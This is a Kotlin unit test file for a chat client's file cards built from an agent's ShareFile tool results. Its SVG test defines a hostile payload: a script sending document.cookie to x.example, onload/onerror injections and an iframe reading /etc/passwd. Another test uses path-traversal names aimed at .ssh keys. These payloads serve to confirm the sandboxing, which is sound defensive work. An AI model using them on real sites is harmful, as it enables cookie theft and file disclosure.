package dev.conclave.client

import dev.conclave.client.logic.FileCardData
import dev.conclave.client.logic.FileCards
import dev.conclave.client.model.ContentBlock
import dev.conclave.client.model.ToolResultBlock
import dev.conclave.client.model.ToolUseBlock
import kotlinx.serialization.json.JsonObject
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

/** The shared file call (ConclaveClientFiles.kt) asks the route the web asks: by session and call id, no path. File cards read meta.file (FileCards.kt). */
class ConclaveClientFilesTest {
    @Test
    fun theRouteIsBySessionAndCallId() {
        assertEquals(listOf("api", "sessions", "ses_1", "files", "toolu_2_0"), sessionFilePath("ses_1", "toolu_2_0"))
    }

    // a ShareFile result as the hub stores it (packages/core/src/tools/share-file.ts)
    private fun result(file: String, id: String = "toolu_1", isError: Boolean = false) = ConclaveJson.decodeFromString(
        ContentBlock.serializer(),
        """{"type":"tool_result","toolUseId":"$id","content":"Shared report.pdf","isError":$isError,"meta":{"file":$file}}""",
    ) as ToolResultBlock

    private val pdf = """{"path":"/home/kai/out/report.pdf","device":"local","name":"report.pdf","mediaType":"application/pdf","size":14540}"""

    @Test
    fun metaFileParsesIntoACard() {
        assertEquals(FileCardData("toolu_1", "report.pdf", "application/pdf", 14540), FileCards.of(result(pdf)))
        assertEquals("Q3 report", FileCards.of(result(pdf.dropLast(1) + ""","title":"Q3 report"}"""))?.title)
        assertEquals("PDF, 14.2 KB", FileCards.facts(FileCards.of(result(pdf))!!))
        assertEquals("512 B", FileCards.sizeWords(512))
        assertEquals("3.0 MB", FileCards.sizeWords(3L * 1024 * 1024))
    }

    @Test
    fun aFailedOrMalformedCardIsNone() {
        assertNull(FileCards.of(result(pdf, isError = true)))
        assertNull(FileCards.of(result("""{"name":"x"}""")))
        // a size the hub never sends still parses the message, and makes no card
        assertNull(FileCards.of(result("""{"name":"x","mediaType":"text/plain","size":"12"}""")))
        assertNull(FileCards.of(result(pdf, id = "")))
        assertNull(FileCards.of(null))
    }

    @Test
    fun onlyAShareFileCallMakesACard() {
        val results = mapOf("a" to result(pdf, id = "a"), "b" to result(pdf, id = "b"))
        val uses = listOf(ToolUseBlock("a", "WebFetch", JsonObject(emptyMap())), ToolUseBlock("b", "ShareFile", JsonObject(emptyMap())))
        assertEquals(listOf("b"), FileCards.cards(uses, results).map { it.toolUseId })
    }

    @Test
    fun onlyRasterImagesShowInline() {
        listOf("image/png", "image/jpeg", "image/webp", "image/gif").forEach { assertTrue(FileCards.inlineImage(it), it) }
        listOf("image/svg+xml", "text/html", "application/pdf", "image/bmp", "").forEach { assertFalse(FileCards.inlineImage(it), it) }
    }

    @Test
    fun onlyASmallSvgDrawsInTheWebView() {
        val svg = FileCardData("t", "chart.svg", "image/svg+xml", 1000)
        assertTrue(FileCards.inlineSvg(svg))
        assertTrue(FileCards.inlineSvg(svg.copy(size = FileCards.SVG_MAX)))
        assertFalse(FileCards.inlineSvg(svg.copy(size = FileCards.SVG_MAX + 1)))
        listOf("text/html", "application/xhtml+xml", "image/png", "text/plain", "application/json", "application/pdf", "").forEach {
            assertFalse(FileCards.inlineSvg(svg.copy(mediaType = it)), it)
        }
    }

    @Test
    fun theSvgPageHoldsOnlyABase64Image() {
        val evil = """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch('https://x.example/'+document.cookie)</script></svg>"></img><script>alert(2)</script><iframe src="file:///etc/passwd">"""
        val title = """"><script>alert(3)</script><img src=x onerror=alert(4) '"""
        val doc = FileCards.svgDocument(evil.toByteArray(), title)
        val data = java.util.Base64.getEncoder().encodeToString(evil.toByteArray())
        // the bytes appear only as base64, inside the one image's src
        assertTrue(doc.contains("""src="data:image/svg+xml;base64,$data"></body>"""))
        assertTrue(Regex("^[A-Za-z0-9+/=]*$").matches(data))
        assertFalse(doc.contains("<script", ignoreCase = true))
        assertFalse(doc.contains("<iframe", ignoreCase = true))
        assertFalse(doc.contains("onload"))
        assertFalse(doc.contains("file:"))
        assertFalse(doc.contains("http://") || doc.contains("https://"))
        assertEquals(1, Regex("<img ").findAll(doc).count())
        assertTrue(doc.contains("""alt="&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;img src=x onerror=alert(4) &#39;""""))
        assertTrue(doc.contains("""content="default-src 'none'; img-src data:; style-src 'unsafe-inline'""""))
    }

    @Test
    fun theCachedCopyStaysInItsFolder() {
        val card = FileCardData("t", "../../.ssh/id ed25519?.txt", "text/plain", 1)
        assertEquals("id ed25519_.txt", FileCards.cacheName(card))
        assertEquals("file", FileCards.cacheName(card.copy(name = "...")))
        assertEquals("______x", FileCards.cacheFolder(card.copy(toolUseId = "../../x")))
    }
}
